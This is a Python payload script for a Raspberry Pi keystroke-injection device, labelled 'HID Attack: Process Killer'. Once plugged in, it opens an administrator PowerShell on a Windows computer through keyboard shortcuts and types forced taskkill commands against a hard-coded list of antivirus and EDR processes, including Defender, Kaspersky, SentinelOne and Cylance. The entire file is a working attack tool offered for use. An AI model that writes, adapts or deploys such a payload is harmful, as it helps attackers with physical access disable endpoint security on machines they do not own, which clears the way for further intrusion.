#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from hid_helper import hid_helper

PROCESSES_TO_KILL = [
    "MsMpEng.exe", "NisSrv.exe", "MsSense.exe", "avp.exe", "avguard.exe",
    "bdagent.exe", "mbam.exe", "SentinelAgent.exe", "CylanceSvc.exe"
]

def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

def run_attack():
    show_message(["HID Attack:", "Process Killer"])
    
    if not hid_helper.is_hid_gadget_enabled:
        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
        time.sleep(3)
        return

    kill_commands = ""
    for proc in PROCESSES_TO_KILL:
        kill_commands += f"taskkill /f /im {proc}; "
    
    try:
        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.x)
        time.sleep(0.5)
        hid_helper.press_key(hid_helper.keyboard.a)
        time.sleep(1.5)
        hid_helper.type_string(kill_commands)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
        hid_helper.type_string("exit")
        hid_helper.press_key(hid_helper.keyboard.enter)
        
        show_message(["Attack Sent!", "AV/EDR processes", "targeted."])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Process Killer payload finished.")